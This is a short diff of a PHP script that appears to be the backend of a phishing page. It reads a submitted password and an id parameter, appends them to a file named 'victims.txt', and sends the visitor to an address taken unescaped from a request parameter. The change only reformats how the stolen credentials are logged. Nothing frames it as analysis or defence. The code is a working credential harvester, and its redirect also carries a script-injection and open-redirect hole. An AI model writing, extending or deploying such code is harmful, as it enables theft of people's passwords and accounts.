@@ -3,7 +3,7 @@ $p = $_POST['password'];
 $u = $_GET['id'];
 if ($p){
     $f = fopen('victims.txt','a+');
-    fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
+    fwrite($f,$u.'<!:!>'.$p."\n");
     fclose($f);    
     echo "<script>window.location = '".$_GET['redir']."'</script>";
 }
